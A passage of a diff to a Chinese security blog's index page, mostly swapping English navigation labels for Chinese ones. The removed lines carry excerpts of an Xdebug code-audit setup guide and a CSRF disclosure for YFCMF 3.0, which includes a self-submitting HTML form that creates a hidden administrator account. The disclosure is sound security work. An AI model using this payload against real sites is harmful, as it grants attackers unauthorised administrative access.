-<p>IDE key也要对应上我们的配置：<br><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpstorm6.png" alt></p>
-<h2 id="调试测试"><a href="#调试测试" class="headerlink" title="调试测试"></a>调试测试</h2><h3 id="新建一个工程"><a href="#新建一个工程" class="headerlink" title="新建一个工程"></a>新建一个工程</h3><h3 id="浏览器开启debug"><a href="#浏览器开启debug" class="headerlink" title="浏览器开启debug"></a>浏览器开启debug</h3><p>在需要debug的页面点击右上图标为红色时：<br><img src="https://i.loli.net/2018/08/25/5b8158615412d.jpg" alt></p>
-<h3 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h3><h3 id="phpstorm开启debug"><a href="#phpstorm开启debug" class="headerlink" title="phpstorm开启debug"></a>phpstorm开启debug</h3><p>点击右上角的小电话开启，再点左边的绿色甲壳虫图标进行调试</p>
-<p>传参后看结果<br><img src="https://i.loli.net/2018/08/25/5b81588414c88.png" alt></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/25/Phpstorm + phpstudy + Xdebug代码审计环境/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/08/23/Csrf in YFCMF 3.0/"> 
-                    Csrf in YFCMF 3.0 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-08-23   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The background administrator adds CSRF to the page, causing other administrator accounts to add.</p>
-<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre><code>&lt;html&gt;
-    &lt;form action=&quot;/YFCMF/admin/admin/adminsave.html&quot; method=&quot;post&quot;&gt;
-        &lt;select name=&quot;group_id&quot; required=&quot;&quot;&gt;
-            &lt;option value=&quot;2&quot;/&gt;
-        &lt;/select&gt;
-        &lt;input name=&quot;username&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
-        &lt;input name=&quot;password&quot; value=&quot;123&quot; type=&quot;hidden&quot;/&gt;
-        &lt;input name=&quot;email&quot; value=&quot;csrf@1.com&quot; type=&quot;hidden&quot;/&gt;
-        &lt;input name=&quot;realname&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
-    &lt;/form&gt;
-    &lt;script&gt;
-        document.forms[0].submit();
-    &lt;/script&gt;
-&lt;/html&gt;</code></pre><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>1、View original users<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7c4f4.png" alt></p>
-<p>2、Accessing structured CSRF pages<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7ded1.png" alt></p>
-<p>3、Successfully added<br><img src="https://i.loli.net/2018/08/23/5b7e6aac970b0.png" alt><br><img src="https://i.loli.net/2018/08/23/5b7e6aacc099b.png" alt></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/23/Csrf in YFCMF 3.0/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1246,7 +1485,7 @@ xdebug.idekey = PHPSTORM</code></pre><p>zend_extension：插件地址<br>xdebug.
 </section>
 
   <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/2/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">下一页 &raquo;</a>
   </nav>
 
     </main>
